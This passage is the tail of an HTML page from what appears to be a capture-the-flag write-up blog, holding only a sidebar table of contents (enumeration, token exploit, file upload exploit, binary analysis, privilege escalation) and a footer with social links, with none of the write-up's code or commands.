+</code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label=aside class="w-20-l mt6-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style=position:sticky;top:5rem><p class="f5 b mb3">Contents of this write-up</p><nav id=TableOfContents><ul><li><a href=#port-scanning>Port scanning</a></li><li><a href=#web-enumeration>Web enumeration</a></li><li><a href=#registering-a-new-account>Registering a new account</a></li><li><a href=#finding-vulnerabilities>Finding vulnerabilities</a></li><li><a href=#graphql-enumeration>GraphQL enumeration</a></li><li><a href=#exploit-to-get-admintoken>Exploit to get <code>adminToken</code></a></li><li><a href=#exploiting-the-video-file-upload>Exploiting the video file upload</a></li><li><a href=#system-enumeration>System enumeration</a></li><li><a href=#analyzing-the-nreport-binary>Analyzing the <code>nreport</code> binary</a></li><li><a href=#planning-the-exploit>Planning the exploit</a></li><li><a href=#privilege-escalation>Privilege escalation</a></li></ul></nav></div></aside></article></main><footer class="bg-black bottom-0 w-100 pa3" role=contentinfo><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href=https://7rocky.github.io/ title=https://7rocky.github.io/>&copy; 7Rocky 2022</a><div style=margin-top:8px><div><div><a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel=noopener aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></footer></body></html>
